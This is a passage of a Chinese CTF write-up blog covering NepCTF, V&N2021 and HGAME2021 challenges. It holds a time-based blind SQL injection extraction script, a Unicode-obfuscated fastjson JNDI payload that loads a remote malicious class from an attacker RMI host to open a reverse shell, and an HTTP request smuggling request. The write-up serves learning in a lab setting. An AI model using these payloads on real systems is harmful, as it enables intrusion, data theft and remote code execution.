(str[0x24] !&#x3D; &#39;&#125;&#39;))    &#123;        Console.WriteLine(&quot;Nope!&quot;);        Console.ReadKey();    &#125;    else    &#123;        for (int i &#x3D; 0; i &lt; 0x20; i++)        &#123;            key &#x3D; key + Convert.ToChar((int) (buffer[i] ^ 0x33)).ToString();        &#125;        if (string.Compare(class2.AesEncrypt(str, key), strB) &#x3D;&#x3D; 0)        &#123;            Console.WriteLine(&quot;wow, you pass it!&quot;);            Console.ReadKey();        &#125;        else        &#123;            Console.WriteLine(&quot;Nope!&quot;);            Console.ReadKey();        &#125;    &#125;&#125;</code></pre><p>反编译出c#代码</p><p>写exp：</p><pre class="language-none"><code class="language-none">a &#x3D; [0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12]for i in range(len(a)):    print(chr(a[i] ^ 0x33),end&#x3D;&quot;&quot;)</code></pre><pre class="language-none"><code class="language-none">λ python3 test.pybadbadwomen!!!!!!!!!!!!!!!!!!!!!</code></pre><p>Aes加密网站一波：</p><img src="/article/Nepctf2021/20210322133852.png" class="" width="20210322133852" loading="lazy"><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>很有收获，尤其是《简单的php反序列化》，又学到一个新姿势。</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V&amp;N2021公开赛</title>
      <link href="article/VN2021ctf/"/>
      <url>article/VN2021ctf/</url>
      
        <content type="html"><![CDATA[<p>比赛昵称：别答了别答了再答人傻了</p><span id="more"></span><p>比赛情况：</p><img src="/article/VN2021ctf/image-20210315121953685.png" class="" title="image-20210315121953685" loading="lazy"><p>孩子太菜了，后面实在不会做了…</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h3><p>小游戏题上来就改js</p><img src="/article/VN2021ctf/image-20210315122233099.png" class="" title="image-20210315122233099" loading="lazy"><p>发现游戏关键函数，直接改数据然后<code>Init()</code>,最好疯狂<code>NextLevel()</code>跳到第10关</p><img src="/article/VN2021ctf/image-20210315122433276.png" class="" title="image-20210315122433276" loading="lazy"><p>直接从第十关开始，上去撸boss，出flag</p><img src="/article/VN2021ctf/image-20210315122540586.png" class="" title="image-20210315122540586" loading="lazy"><p>也可以本地保存，直接算js的flag，或者开god模式.<img src="/article/VN2021ctf/image-20210315122714928.png" class="" title="image-20210315122714928" loading="lazy"></p><p>再不行…后面还发现了个函数…<code>boss.Kill()</code></p><hr><h3 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h3><p>hint：我的代码不能注入吧</p><img src="/article/VN2021ctf/image-20210315122917856.png" class="" title="image-20210315122917856" loading="lazy"><p>打开登陆界面，第一反应注入，冷静下看数据量很少，拿出祖传20w字典爆破。</p><p>再冷静下测试一下，确认是sql注入</p><pre class="language-none"><code class="language-none">username&#x3D;\&amp;password&#x3D;or 1&#x3D;1# ·不报错username&#x3D;\&amp;password&#x3D;&#39; ·报错username&#x3D;\&amp;password&#x3D;&#39;&#39; ·不报错username&#x3D;\&amp;password&#x3D;&#39;# ·不报错username&#x3D;\&amp;password&#x3D;&#39;or 1&#x3D;0# ·不报错username&#x3D;\&amp;password&#x3D;&#39;or # ·500报错username&#x3D;\&amp;password&#x3D;&#39;and if(1,sleep(10),select 1)# ·不报错无延时username&#x3D;admin&amp;password&#x3D;&#39;and if(0,sleep(10),select 1)# ·不报错无延时发现没啥用...</code></pre><p>推测后端为：<code>select * from user where username=&#39;$username&#39; and password=&#39;$password&#39;</code></p><p>过滤了sleep()可能</p><p>这里没回显的就延时注入，<code>sleep()</code>,<code>Benchmark()</code>,或者笛卡尔积</p><h4 id="笛卡尔积延时注入"><a href="#笛卡尔积延时注入" class="headerlink" title="笛卡尔积延时注入"></a>笛卡尔积延时注入</h4><p>当然延时不精确，count(*)数量大时，费时就高，何况比赛机子<strong>极其不稳定</strong>，不清楚是我卡了还是机器卡了。</p><blockquote><p>笛卡尔积延时注入</p><p>count(*)后面所有表中的列笛卡尔积数，数量越多越卡，就会有延迟，类似之前某比赛pgsql的延时注入也可以利用此来打时间差，从而达到延时注入的效果</p><p>参考之前的WP：<a href="/article/cqb2021">春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</a></p><pre class="language-none"><code class="language-none">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;+-----------+| count(*)  |+-----------+| 113101560 |+-----------+1 row in set (2.07 sec)mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);+------+-----+| user | pwd |+------+-----+| 1    | 0   |+------+-----+1 row in set (2.08 sec)</code></pre></blockquote><p>甚至数量大了把我数据库给跑崩了…</p><img src="/article/VN2021ctf/image-20210315142653488.png" class="" title="image-20210315142653488" loading="lazy"><p>payload：</p><pre class="language-none"><code class="language-none">-1&#39;and if(&#96;payload&#96;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#</code></pre><p>脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3月 14, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> randomurl <span class="token operator">=</span> <span class="token string">"http://&#123;&#125;.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login"</span><span class="token comment"># &#123;&#125;由于开了多个靶机，每次随机访问某个靶机，可以减少冲突可能</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> payload    <span class="token punctuation">&#125;</span>    url1 <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 随机访问</span>    <span class="token comment"># print(url1)</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment"># 不限制超时</span>    <span class="token comment"># print(res.text)</span>    <span class="token keyword">if</span> <span class="token string">"504 Gateway Time-out"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span> <span class="token comment"># 504即为正确</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">def</span> <span class="token function">binary_search</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 二分法~</span>    <span class="token comment"># payload = payload.replace("=",">=")</span>    high <span class="token operator">=</span> <span class="token number">127</span>    low <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> mid <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span> high <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> req<span class="token punctuation">(</span>payload <span class="token operator">%</span> mid<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> mid            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">+</span> low<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        pd <span class="token operator">=</span> payload <span class="token operator">%</span> mid        <span class="token keyword">if</span> req<span class="token punctuation">(</span>pd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid<span class="token keyword">def</span> <span class="token function">version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr(version(),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        <span class="token comment"># 1'and/**/if(ascii(substr(version(),1,1))>64,1,1)like/**/1#</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"version==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr(database(),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"databases==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token comment"># databases==========>ctf</span><span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('ctf')),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"tables==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token comment"># tables==========>ctf</span><span class="token keyword">def</span> <span class="token function">columns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment"># 孩子没跑了，太卡了</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"columns==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">" "</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment"># 孩子没跑了，太卡了</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"data==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># version()</span>    <span class="token comment"># database()</span>    table<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># columns()</span>    <span class="token comment"># data()</span></code></pre><p>孩子实在跑不下去了</p><img src="/article/VN2021ctf/image-20210315125931827.png" class="" title="image-20210315125931827" loading="lazy"><p>py出题人换了密码<code>no_0ne_kn0w_th1s</code></p><pre class="language-none"><code class="language-none">username&#x3D;admin&amp;password&#x3D;no_0ne_kn0w_th1s</code></pre><p>登录成功</p><img src="/article/VN2021ctf/image-20210315130110417.png" class="" title="image-20210315130110417" loading="lazy"><p>js加载图片</p><img src="/article/VN2021ctf/image-20210315135332875.png" class="" title="image-20210315135332875" loading="lazy"><p>发现<code>/searchimage</code>可以目录穿越，读不到flag，可能名字不对，读到了<code>pom.xml</code></p><img src="/article/VN2021ctf/image-20210315135240650.png" class="" title="image-20210315135240650" loading="lazy"><p>抓包看</p><img src="/article/VN2021ctf/image-20210315130306763.png" class="" title="image-20210315130306763" loading="lazy"><p>结合应该是fastjson反序列化漏洞</p><h4 id="fastjson-lt-1-2-68反序列化漏洞"><a href="#fastjson-lt-1-2-68反序列化漏洞" class="headerlink" title="fastjson &lt;1.2.68反序列化漏洞"></a>fastjson &lt;1.2.68反序列化漏洞</h4><p>直接payload试一下，被ban了</p><img src="/article/VN2021ctf/image-20210315130941235.png" class="" title="image-20210315130941235" loading="lazy"><p>需要绕过，JSONObject.parseObject()会自动会把json字符串中的Unicode码进行转换，所以转成Unicode即可</p><p>服务器起 <a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></p><p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;payload&quot; -A ip</code></p><img src="/article/VN2021ctf/image-20210315140129288.png" class="" title="image-20210315140129288" loading="lazy"><p>再起监听端口</p><p>最后打payload</p><pre class="language-json" data-language="json"><code class="language-json">roleJson= <span class="token punctuation">&#123;</span><span class="token property">"e"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span><span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>;<span class="token comment">// 需要Unicode编码</span></code></pre><img src="/article/VN2021ctf/image-20210315140159832.png" class="" title="image-20210315140159832" loading="lazy"><pre class="language-json" data-language="json"><code class="language-json">roleJson= <span class="token punctuation">&#123;</span><span class="token property">"e"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073"</span><span class="token punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span><span class="token property">"\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>;</code></pre><p>服务器加载了恶意class文件，成功getshell</p><img src="/article/VN2021ctf/image-20210315140505582.png" class="" title="image-20210315140505582" loading="lazy"><p>编码问题，整了一个小时就是反弹不了shell，原来是java反弹shell的编码问题，去<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">网站</a>编码一下就成功了</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>孩子好菜，被《简单的签到》搞傻了。查阅了不少资料，拜读了很多大佬的博客，虽然最后还是没做出来，等等WP康康大佬的思路也许比自己忙活半天有用，当然少不了原理的研究。</p><p>继续学习啦</p><p>（想结识更多大佬）</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2021</title>
      <link href="article/hgame2021/"/>
      <url>article/hgame2021/</url>
      
        <content type="html"><![CDATA[<p>HAME2021-week 个人WP</p><p>昵称：Err0r</p><span id="more"></span><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><p>这是week1，做了Web和部分Misc，后续会整合成一篇文章(先让我水着)</p><img src="/article/hgame2021/image-20210206151019347.png" class="" title="image-20210206151019347" loading="lazy"><p><strong>由于某些原因，以后会注重原理上的研究</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><p>题目描述： 第一次在银河系里搭顺风车，要准备啥，在线等，挺急的 </p><p>题目地址： <a href="http://hitchhiker42.0727.site:42420/">http://hitchhiker42.0727.site:42420</a> </p><img src="/article/hgame2021/image-20210206151406243.png" class="" title="image-20210206151406243" loading="lazy"><p>抓包看看顺风车啥样</p><img src="/article/hgame2021/image-20210206151614330.png" class="" title="image-20210206151614330" loading="lazy"><p>状态码405Method Not Allowed</p><p>对于任何客户端请求都要进行一套流程，即DNS解析域名返回IP，打开IP套接字(socket)连接IP，再通过套接字写HTTP数据流，最后从WEB服务器接受响应的HTTP数据流。而405状态码就是最后一步生成的，即服务器不响应这种请求方式，请求方式有GET&#x2F;POST&#x2F;HEAD&#x2F;PUT等，换成POST看看。</p><blockquote><p>注意:在burpsuite里面，右键改变请求方式即可</p><img src="/article/hgame2021/image-20210206152237254.png" class="" title="change" loading="lazy"></blockquote><p>随后提示<code>只有使用&quot;无限非概率引擎&quot;(Infinite Improbability Drive)才能访问这里～</code></p><img src="/article/hgame2021/image-20210206152332459.png" class="" title="image-20210206152332459" loading="lazy"><p>这里只要改UA就行了，User-Agent 简单来说就是告诉服务器访问者是通过什么工具来请求的，添加<code>Infinite Improbability Drive</code>或者直接删掉UA只加这个也可以</p><p>随后提示</p><pre class="language-none"><code class="language-none">你知道吗？&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;github.com&#x2F;wuhan005&quot;&gt;茄子&lt;&#x2F;a&gt;特别要求：你得从他的&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;cardinal.ink&#x2F;&quot;&gt;Cardinal&lt;&#x2F;a&gt;过来</code></pre><img src="/article/hgame2021/image-20210206152624452.png" class="" title="image-20210206152624452" loading="lazy"><p>这里是要改Referer，简单来说就是告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理，用法一般是为了防外连接，直接用<code>&lt;a href=&quot;&quot;&gt;</code>，<code>用Submit或&lt;input type=&quot;image&quot;&gt;提交的表单(POST或GET)</code>，或者<code>使用JavaScript提交的[表单](https://baike.baidu.com/item/表单)(POST或GET)</code>都是会带上Referer，当然伪造也很简单。</p><p>最后提示<code>flag仅能通过本地访问获得</code></p><img src="/article/hgame2021/image-20210206153338355.png" class="" title="image-20210206153338355" loading="lazy"><p>很简单的XFF，XFF就是表示客户端最原始的IP地址，也是很容易伪造</p><img src="/article/hgame2021/image-20210206153608572.png" class="" title="image-20210206153608572" loading="lazy"><p>python脚本如下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/2/6 15:57@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://hitchhiker42.0727.site:42420/HitchhikerGuide.php"</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span> <span class="token punctuation">:</span> <span class="token string">"Infinite Improbability Drive"</span><span class="token punctuation">,</span>    <span class="token string">"Referer"</span> <span class="token punctuation">:</span> <span class="token string">"https://cardinal.ink/"</span><span class="token punctuation">,</span>    <span class="token string">"X-Forwarded-For"</span> <span class="token punctuation">:</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">&#125;</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><p>看着直观点</p><hr><h3 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h3><p>题目描述： 简单且上头的游戏 </p><p>题目地址 ： <a href="http://watermelon.ryen.xyz:800/">http://watermelon.ryen.xyz:800/</a> </p><p>紧跟潮流的小游戏，作者把源码公开了，所以有很多二创。抢了个一血</p><img src="/article/hgame2021/first.png" class="" title="first" loading="lazy"><p>手快2333</p><img src="/article/hgame2021/image-20210206153657660.png" class="" title="image-20210206153657660" loading="lazy"><p>看到小游戏题，第一眼看js，github搜一圈了解到这个游戏的源码在.&#x2F;src&#x2F;project.js。但是代码四千行，因为游戏开源，所以很容易能找到分析的源码资料，<a href="https://www.cnblogs.com/xuanyu-10-18/p/14340204.html">参考链接</a>，直接搜到控制分数的代码，改掉</p><img src="/article/hgame2021/image-20210206155153207.png" class="" title="image-20210206155153207" loading="lazy"><p>可以看到这一块3436行<code>default.score</code>是计分块，改成+999999保存，然后把游戏玩结束弹flag</p><img src="/article/hgame2021/image-20210206155459828.png" class="" title="image-20210206155459828" loading="lazy"><hr><h3 id="宝藏走私者"><a href="#宝藏走私者" class="headerlink" title="宝藏走私者"></a>宝藏走私者</h3><p>题目描述： </p><p><strong>资料：<a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></strong><br>宝藏走私者 Switch 喜欢偷盗并将奇特的宝藏走私到一些黑市商家手中。<br>为了阻止其继续作恶，警探 Liki 奉命将 Switch 抓捕归案。<br>调查过程中，Liki 发现 Switch 将一个秘密藏在了一个私人服务器中。<br>这或许会成为后续追查 Switch 的重大线索，你能找到这个秘密吗？ </p><p>题目链接： <a href="http://thief.0727.site/">http://thief.0727.site:80</a> </p><p><strong>hint: 注意留意服务器信息</strong> </p><p>HTTP请求走私，资料里讲的很详细，建议仔细读一下，这里不做过多阐述</p><p>payload：</p><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: thief.0727.sitePragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.104 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Content-Length: 95Transfer-Encoding: chunked0GET &#x2F;secret HTTP&#x2F;1.1Content-Length: 30Host: thief.0727.siteClient-IP: 127.0.0.11</code></pre><img src="/article/hgame2021/image-20210206161847925.png" class="" title="image-20210206161847925" loading="lazy"><hr><h3 id="智商检测鸡"><a href="#智商检测鸡" class="headerlink" title="智商检测鸡"></a>智商检测鸡</h3><p>题目描述： 